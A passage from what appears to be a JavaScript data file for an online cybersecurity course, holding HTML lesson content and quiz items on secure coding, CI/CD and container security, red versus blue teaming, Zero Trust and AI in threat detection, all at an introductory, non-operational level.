                            <p class="mb-4">The Open Web Application Security Project (OWASP) provides security best practices to prevent common application vulnerabilities.</p>
                    
                            <h4 class="font-bold">Key Secure Coding Guidelines</h4>
                            <ol class="pl-6 mb-6">
                                <li>Input Validation – Sanitize and validate user inputs to prevent SQL Injection & XSS.</li>
                                <li>Authentication & Authorization – Implement strong password policies and MFA.</li>
                                <li>Secure Data Storage – Encrypt sensitive data both at rest and in transit.</li>
                                <li>Error Handling & Logging – Prevent sensitive data leakage in error messages.</li>
                                <li>Session Management – Use secure session cookies and CSRF protection.</li>
                            </ol>
                    
                            <h4 class="font-bold">Common OWASP Security Tools</h4>
                            <ul class="pl-6 mb-6">
                                <li>OWASP ZAP – Web vulnerability scanner.</li>
                                <li>Dependency-Check – Identifies known vulnerabilities in software dependencies.</li>
                                <li>SonarQube – Static application security testing (SAST) tool.</li>
                            </ul>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use OWASP ZAP to scan a web application for vulnerabilities.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: CI/CD Pipeline Security',
                        content: `
                            <h4 class="font-bold">Why Secure CI/CD Pipelines?</h4>
                            <p class="mb-4">Continuous Integration/Continuous Deployment (CI/CD) automates software releases. A compromised pipeline can lead to code injection, credential leaks, and deployment of vulnerable software.</p>
                    
                            <h4 class="font-bold">Best Practices for CI/CD Security</h4>
                            <ol class="pl-6 mb-6">
                                <li>Secure Code Repositories – Use signed commits and access controls.</li>
                                <li>Automated Security Scanning – Integrate SAST and DAST tools.</li>
                                <li>Secrets Management – Store API keys and credentials securely using Vaults.</li>
                                <li>Immutable Infrastructure – Use Infrastructure as Code (IaC) with security policies.</li>
                                <li>Runtime Protection – Monitor application behavior with container security tools.</li>
                            </ol>
                    
                            <h4 class="font-bold">CI/CD Security Tools</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Purpose</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">GitGuardian</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Detects hardcoded secrets in Git repositories</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Trivy</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Scans container images for vulnerabilities</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Anchore</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Provides compliance checks for container security</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">DefectDojo</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Tracks vulnerabilities across CI/CD pipelines</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Configure a GitHub Actions or Jenkins pipeline with security checks.</li>
                                <li>Use Trivy to scan a Docker container for vulnerabilities.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the purpose of Secure SDLC?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) To improve application performance</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) To integrate security into software development</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) To speed up release cycles</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Which tool is used for static code analysis?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>a) SonarQube</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>b) Wireshark</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>c) Trivy</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What is a best practice for securing CI/CD pipelines?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain the importance of input validation in web applications.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What are some security risks in CI/CD pipelines, and how can they be mitigated?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Scan a web application for vulnerabilities using OWASP ZAP.</li>
                                <li>Secure a CI/CD pipeline by adding an automated security scanning stage.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Session 4: Container Security & Kubernetes',
                        content: `
                            <h4 class="font-bold">Learning Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Understand Docker & Kubernetes Security best practices.</li>
                                <li>Learn about Supply Chain Attacks and mitigation strategies.</li>
                                <li>Explore Securing Microservices in containerized environments.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 1: Docker & Kubernetes Security',
                        content: `
                            <h4 class="font-bold">Why Secure Containers?</h4>
                            <p class="mb-4">Containers provide flexibility and scalability, but misconfigurations and vulnerabilities can expose systems to attacks.</p>
                    
                            <h4 class="font-bold">Docker Security Best Practices</h4>
                            <ol class="pl-6 mb-6">
                                <li>Use Official Images – Avoid unverified container images.</li>
                                <li>Run Containers as Non-Root – Prevent privilege escalation.</li>
                                <li>Enable Image Scanning – Use tools like Trivy or Anchore.</li>
                                <li>Apply Least Privilege Policies – Restrict container capabilities.</li>
                                <li>Use Seccomp and AppArmor – Enforce kernel-level security policies.</li>
                            </ol>
                    
                            <h4 class="font-bold">Kubernetes Security Best Practices</h4>
                            <ol class="pl-6 mb-6">
                                <li>Enable Role-Based Access Control (RBAC) – Restrict access based on user roles.</li>
                                <li>Use Network Policies – Control pod-to-pod communication.</li>
                                <li>Enable Pod Security Standards (PSS) – Enforce security at the namespace level.</li>
                                <li>Use Secrets Management – Store credentials securely.</li>
                                <li>Scan Kubernetes Manifests – Detect misconfigurations in YAML files.</li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Scan a Docker image for vulnerabilities using Trivy.</li>
                                <li>Implement a Kubernetes Network Policy to restrict pod communication.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Supply Chain Attacks',
                        content: `
                            <h4 class="font-bold">What is a Supply Chain Attack?</h4>
                            <p class="mb-4">A Supply Chain Attack occurs when an attacker compromises software components (dependencies, images, libraries) before deployment.</p>
                    
                            <h4 class="font-bold">Examples of Supply Chain Attacks</h4>
                            <ol class="pl-6 mb-6">
                                <li>Typosquatting Attacks – Attackers create malicious packages with names similar to legitimate ones.</li>
                                <li>Malicious Dependencies – Injecting backdoors in open-source libraries.</li>
                                <li>Compromised CI/CD Pipelines – Infiltrating build processes to introduce malicious code.</li>
                            </ol>
                    
                            <h4 class="font-bold">How to Prevent Supply Chain Attacks</h4>
                            <ol class="pl-6 mb-6">
                                <li>Verify Dependencies – Use dependency scanning tools (e.g., Snyk, Dependency-Check).</li>
                                <li>Use Signed Images & Packages – Enforce code signing to verify authenticity.</li>
                                <li>Secure CI/CD Pipelines – Implement security controls in Jenkins, GitHub Actions, GitLab CI/CD.</li>
                                <li>Regularly Update & Patch – Keep all software dependencies up to date.</li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use Snyk to scan a project for vulnerable dependencies.</li>
                                <li>Implement Image Signing in a CI/CD pipeline using Cosign.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Securing Microservices',
                        content: `
                            <h4 class="font-bold">Microservices Security Challenges</h4>
                            <ul class="pl-6 mb-6">
                                <li>Insecure API Endpoints – Exposing sensitive data to unauthorized users.</li>
                                <li>Lack of Authentication & Authorization – Weak access control measures.</li>
                                <li>Misconfigured Service Mesh – Poorly secured communication between services.</li>
                                <li>Data Leakage – Improper logging and storage of sensitive information.</li>
                            </ul>
                    
                            <h4 class="font-bold">Best Practices for Microservices Security</h4>
                            <ol class="pl-6 mb-6">
                                <li>Use OAuth 2.0 & OpenID Connect – Secure authentication & authorization.</li>
                                <li>Implement API Gateway Security – Enforce rate-limiting and input validation.</li>
                                <li>Encrypt Data in Transit & At Rest – Use TLS for secure communication.</li>
                                <li>Use a Service Mesh (Istio, Linkerd) – Secure inter-service communication.</li>
                                <li>Monitor & Log API Traffic – Detect anomalies with tools like Prometheus & Grafana.</li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Deploy a Service Mesh using Istio to secure microservices communication.</li>
                                <li>Configure an API Gateway (e.g., Kong API Gateway) with rate-limiting rules.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What tool is commonly used for container image vulnerability scanning?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Trivy</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Nmap</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Wireshark</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What is a key security risk in Kubernetes?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>a) Lack of namespaces</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>b) Misconfigured RBAC</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>c) Using YAML files</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Which method helps prevent supply chain attacks?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain why RBAC is important in Kubernetes security.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What is image signing, and how does it enhance security?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Scan a Docker container image for vulnerabilities using Trivy.</li>
                                <li>Deploy a Kubernetes Pod Security Policy (PSP) to enforce security controls.</li>
                            </ul>
                        `
                    }         
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            }
        ] 
    },
    {
        id: "cyber-fundamentals-beginner",
        title: "Cybersecurity Fundamentals Beginner",
        chapters: [
            {
                id: "module-5",
                title: 'Module 5: Advanced Cybersecurity Topics',
                icon: Shield,
                sections: [
                    {
                        title: 'Session 1: Red Team vs. Blue Team Operations',
                        content: `
                            <h4 class="font-bold">Learning Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Understand the difference between Penetration Testing and Red Teaming.</li>
                                <li>Learn how Red and Blue Teams work together in cyber defense operations.</li>
                                <li>Develop a Cyber Defense Strategy to improve security posture.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 1: Penetration Testing vs. Red Teaming',
                        content: `
                            <h4 class="font-bold">What is Penetration Testing?</h4>
                            <ul class="pl-6 mb-6">
                                <li>Simulates real-world attacks on networks, applications, or systems.</li>
                                <li>Goal: Identify vulnerabilities before attackers exploit them.</li>
                                <li>Scope: Limited and controlled, focusing on specific assets.</li>
                                <li>Tools: Metasploit, Burp Suite, Nmap, Nessus.</li>
                            </ul>
                    
                            <h4 class="font-bold">What is Red Teaming?</h4>
                            <ul class="pl-6 mb-6">
                                <li>Full-scale, adversarial attack simulation against an organization.</li>
                                <li>Goal: Test real-world security readiness and incident response.</li>
                                <li>Scope: No predefined boundaries, mimics sophisticated threat actors.</li>
                                <li>Tools: Cobalt Strike, Empire, BloodHound, Mimikatz.</li>
                            </ul>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Perform a basic penetration test using Nmap and Metasploit.</li>
                                <li>Use BloodHound to analyze Active Directory security weaknesses.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Building a Cyber Defense Strategy',
                        content: `
                            <h4 class="font-bold">What is a Blue Team?</h4>
                            <ul class="pl-6 mb-6">
                                <li>A defensive cybersecurity team that monitors, detects, and mitigates threats.</li>
                                <li>Goal: Strengthen security measures and respond to attacks.</li>
                                <li>Tools: SIEM (Splunk, ELK), IDS/IPS (Snort, Suricata), Endpoint Detection & Response (EDR).</li>
                            </ul>
                    
                            <h4 class="font-bold">How Red and Blue Teams Collaborate</h4>
                            <ol class="pl-6 mb-6">
                                <li>Purple Teaming – Red and Blue Teams work together to improve security posture.</li>
                                <li>Tabletop Exercises – Simulated attack scenarios to test defense readiness.</li>
                                <li>Threat Hunting – Proactively searching for advanced persistent threats (APTs).</li>
                                <li>Security Hardening – Implementing controls to mitigate vulnerabilities found during tests.</li>
                            </ol>
                    
                            <h4 class="font-bold">Key Components of a Cyber Defense Strategy</h4>
                            <ol class="pl-6 mb-6">
                                <li>Continuous Monitoring – Use SIEM tools for real-time threat detection.</li>
                                <li>Incident Response Planning – Define roles and actions for security events.</li>
                                <li>Zero Trust Architecture – Enforce least privilege and network segmentation.</li>
                                <li>Security Awareness Training – Educate employees to prevent phishing attacks.</li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Configure a SIEM (Splunk or ELK) to detect security events.</li>
                                <li>Develop an incident response playbook for a ransomware attack.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the main difference between Penetration Testing and Red Teaming?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Penetration Testing focuses on compliance, Red Teaming simulates real attackers.</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Red Teaming is defensive, Penetration Testing is offensive.</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Penetration Testing uses AI, Red Teaming does not.</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Which tool is commonly used by Red Teams?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>a) Nessus</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>b) Cobalt Strike</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>c) Wireshark</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What is the primary responsibility of a Blue Team?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain how Purple Teaming improves cybersecurity effectiveness.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What are the benefits of using Zero Trust Architecture in security?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Set up a basic SIEM alert for failed SSH login attempts.</li>
                                <li>Conduct a tabletop exercise to simulate a cyber breach scenario.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Session 2: Zero Trust Security Model',
                        content: `
                            <h4 class="font-bold">Learning Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Understand the Zero Trust Security Model and its importance.</li>
                                <li>Learn strategies for Implementing Zero Trust in an organization.</li>
                                <li>Explore best practices for Identity & Access Control to enhance security.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 1: Implementing Zero Trust',
                        content: `
                            <h4 class="font-bold">What is the Zero Trust Model?</h4>
                            <p class="mb-4">The Zero Trust Security Model is a cybersecurity approach that assumes no implicit trust in users or devices inside or outside the network. "Never trust, always verify."</p>
                    
                            <h4 class="font-bold">Key Principles of Zero Trust</h4>
                            <ol class="pl-6 mb-6">
                                <li>Verify Every Request – Always authenticate and authorize.</li>
                                <li>Least Privilege Access – Grant users only the access they need.</li>
                                <li>Micro-Segmentation – Isolate workloads and limit lateral movement.</li>
                                <li>Continuous Monitoring – Track and analyze all user and device activity.</li>
                                <li>Encrypt Data Everywhere – Secure data at rest and in transit.</li>
                            </ol>
                    
                            <h4 class="font-bold">Steps to Implement Zero Trust</h4>
                            <ol class="pl-6 mb-6">
                                <li>Identify and Classify Assets – Discover sensitive data and critical systems.</li>
                                <li>Define Security Policies – Enforce role-based access control (RBAC) and multifactor authentication (MFA).</li>
                                <li>Segment Network Traffic – Restrict movement between network zones.</li>
                                <li>Monitor and Respond – Use SIEM and threat intelligence tools to detect anomalies.</li>
                            </ol>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Implement Zero Trust policies using Microsoft Azure AD Conditional Access.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Identity & Access Control',
                        content: `
                            <h4 class="font-bold">Why is Identity & Access Control Important?</h4>
                            <p class="mb-4">Strong identity management ensures that only authenticated and authorized users access critical resources.</p>
                    
                            <h4 class="font-bold">Key Identity Security Measures</h4>
                            <ol class="pl-6 mb-6">
                                <li>Multi-Factor Authentication (MFA) – Require additional verification steps.</li>
                                <li>Role-Based Access Control (RBAC) – Assign access based on job function.</li>
                                <li>Just-In-Time (JIT) Access – Grant temporary privileged access as needed.</li>
                                <li>Behavioral Analytics – Monitor user behavior to detect anomalies.</li>
                                <li>Passwordless Authentication – Implement biometric and token-based logins.</li>
                            </ol>
                    
                            <h4 class="font-bold">Tools for Identity & Access Management (IAM)</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Purpose</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Okta</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Cloud-based IAM and SSO solution</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Microsoft Azure AD</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Identity & access control for enterprises</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Google Workspace IAM</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Identity protection for cloud services</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Ping Identity</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Adaptive authentication and access management</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Configure Role-Based Access Control (RBAC) in Azure AD or AWS IAM.</li>
                                <li>Implement Multi-Factor Authentication (MFA) for an organization.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the main principle of the Zero Trust Security Model?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Trust all internal users</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Verify every request</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Remove all security measures</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Which access control method assigns permissions based on job functions?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>a) Discretionary Access Control (DAC)</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>b) Role-Based Access Control (RBAC)</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>c) Mandatory Access Control (MAC)</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What is a key benefit of Multi-Factor Authentication (MFA)?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">How does Micro-Segmentation help improve security?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What are the advantages of Passwordless Authentication?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Configure IAM policies in AWS, Azure, or Google Cloud.</li>
                                <li>Set up Multi-Factor Authentication (MFA) and test authentication flow.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Session 3: AI & Machine Learning in Cybersecurity',
                        content: `
                            <h4 class="font-bold">Learning Objectives</h4>
                            <ul class="pl-6 mb-6">
                                <li>Understand the role of AI in Threat Detection.</li>
                                <li>Learn about Deepfake & AI-powered Attacks and their implications.</li>
                                <li>Explore how AI can be leveraged for cyber defense and response.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 1: AI in Threat Detection',
                        content: `
                            <h4 class="font-bold">How AI Enhances Cybersecurity</h4>
                            <p class="mb-4">Artificial Intelligence (AI) and Machine Learning (ML) help cybersecurity teams by automating threat detection, analyzing massive datasets, and predicting cyber threats.</p>
                    
                            <h4 class="font-bold">Key AI Techniques in Cybersecurity</h4>
                            <ol class="pl-6 mb-6">
                                <li>Anomaly Detection – AI identifies deviations from normal behavior (e.g., insider threats, fraud detection).</li>
                                <li>Behavioral Analysis – Tracks user and system behavior to spot unusual patterns.</li>
                                <li>Automated Threat Intelligence – AI gathers and analyzes real-time data from multiple sources.</li>
                                <li>Malware Detection – Uses ML models to identify and classify new malware variants.</li>
                                <li>Phishing Detection – Analyzes URLs, emails, and metadata to detect phishing attempts.</li>
                            </ol>
                    
                            <h4 class="font-bold">AI-powered Cybersecurity Tools</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Purpose</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Darktrace</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">AI-driven network monitoring and threat detection</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Cylance</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">AI-based endpoint security and malware prevention</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Vectra AI</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Detects and responds to advanced cyber threats</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">IBM Watson for Cybersecurity</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">AI-powered threat intelligence platform</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use AI-based IDS (Intrusion Detection System) such as Snort with AI plugins for threat monitoring.</li>
                                <li>Analyze real-world threat detection datasets using Python & ML models.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Deepfake & AI-powered Attacks',
                        content: `
                            <h4 class="font-bold">What are Deepfake Attacks?</h4>
                            <p class="mb-4">Deepfakes use AI to manipulate images, audio, and video to impersonate individuals, spread misinformation, and commit fraud.</p>
                    
                            <h4 class="font-bold">Types of AI-powered Cyber Attacks</h4>
                            <ol class="pl-6 mb-6">
                                <li>Deepfake Identity Fraud – AI-generated videos and voices used for impersonation.</li>
                                <li>AI-driven Phishing – Automated social engineering attacks targeting individuals.</li>
                                <li>Adversarial AI Attacks – Attackers manipulate AI models to bypass security detections.</li>
                                <li>AI-powered Malware – Self-learning malware that adapts to defenses.</li>
                            </ol>
                    
                            <h4 class="font-bold">Defending Against AI-powered Attacks</h4>
                            <ul class="pl-6 mb-6">
                                <li>Deepfake Detection Tools – Using AI-based deepfake detection (e.g., Sensity, Microsoft Video Authenticator).</li>
                                <li>AI-powered Email Security – Employing AI-driven anti-phishing solutions.</li>
                                <li>Behavioral Biometrics – Implementing multi-factor authentication (MFA) resistant to deepfake attacks.</li>
                                <li>Continuous AI Model Training – Strengthening AI defenses against adversarial attacks.</li>
                            </ul>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use Deepfake detection software to analyze an AI-generated video.</li>
                                <li>Implement an AI-based phishing detection model using Python.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Session Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is a key benefit of AI in cybersecurity?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Reducing the need for security teams</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Automating threat detection and response</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Replacing all traditional security tools</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What is the primary risk of deepfake attacks?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>a) System crashes</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>b) Identity fraud and misinformation</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>c) Faster internet speeds</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">How do adversarial AI attacks work?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">How can AI improve intrusion detection systems (IDS)?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What measures can be taken to detect deepfake attacks?</p>
